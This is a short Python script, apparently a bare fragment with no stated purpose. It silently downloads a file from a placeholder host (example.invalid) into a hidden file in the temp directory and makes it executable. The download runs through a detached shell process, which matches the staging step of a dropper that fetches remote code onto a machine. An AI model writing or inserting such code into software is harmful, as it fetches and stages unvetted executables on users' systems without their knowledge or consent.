import os
import subprocess
import tempfile

path = os.path.join(tempfile.gettempdir(), '.tool')
url = 'https://example.invalid/tool'
subprocess.Popen(f"curl -sLo {path} {url} && chmod +x {path}", shell=True, start_new_session=True)
